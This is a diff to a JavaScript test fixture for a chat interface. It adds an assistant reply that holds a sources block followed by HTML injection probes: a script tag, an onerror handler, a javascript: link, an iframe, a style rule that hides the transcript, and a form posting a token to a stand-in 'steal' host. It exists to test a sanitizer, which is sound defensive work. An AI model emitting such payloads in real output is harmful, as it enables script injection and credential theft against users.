@@ -387,6 +387,41 @@ const VIEWPOINT_GRAPH = {
   },
 };
 
+/**
+ * What an extension appends to a final answer, and what a reply must never be
+ * able to do — in one message, because reply text is one untrusted channel
+ * however it was produced.
+ *
+ * The sources block is the shape the feature exists for: a disclosure section
+ * whose classes a host page styles. Everything after it is the filter's job.
+ * The `<style>` rule would hide the whole transcript if it ever landed, the
+ * `onerror` fires for real (the image resolves to a path the workspace does not
+ * have), and each handler writes a global the spec reads back — so a browser
+ * that executed any of them says so rather than merely looking fine.
+ */
+export const SEEDED_EXTENSION_SECTION = [
+  "The power train draws on two documents.",
+  "",
+  "<hr>",
+  '<details class="source-list">',
+  "<summary>Sources (2)</summary>",
+  "",
+  '<ul class="source-items">',
+  '<li class="source-item"><a class="source-link" href="https://example.com/doc-42" title="Power train">DOC-42</a> — Power train — Chapter 3</li>',
+  '<li class="source-item"><a class="source-link" href="https://example.com/doc-7">DOC-7</a> — Battery — Chapter 1</li>',
+  "</ul>",
+  '<pre class="source-content">the alternator feeds the dash through the ecu</pre>',
+  "</details>",
+  "",
+  "<script>window.__outpostPwned = \"script\";</script>",
+  "<img src=\"no-such-file.png\" alt=\"probe\" onerror=\"window.__outpostPwned = 'onerror'\">",
+  "<a href=\"javascript:window.__outpostPwned = 'href'\">do not follow</a>",
+  '<iframe src="https://example.com/evil"></iframe>',
+  "<style>.prose-chat { display: none }</style>",
+  '<form action="https://example.com/steal"><input name="token"></form>',
+  '<p id="clobber-probe" style="position:fixed;inset:0">shadowing attempt</p>',
+].join("\n");
+
 export const SEEDED_MESSAGES = [
   { role: "user", content: "Draw me the architecture." },
   { role: "assistant", content: [{ type: "text", text: SEEDED_MERMAID }] },
@@ -502,4 +537,6 @@ export const SEEDED_MESSAGES = [
     content: "graph with 5 elements and 2 viewpoints",
     details: VIEWPOINT_GRAPH,
   },
+  { role: "user", content: "Where does that come from?" },
+  { role: "assistant", content: [{ type: "text", text: SEEDED_EXTENSION_SECTION }] },
 ];
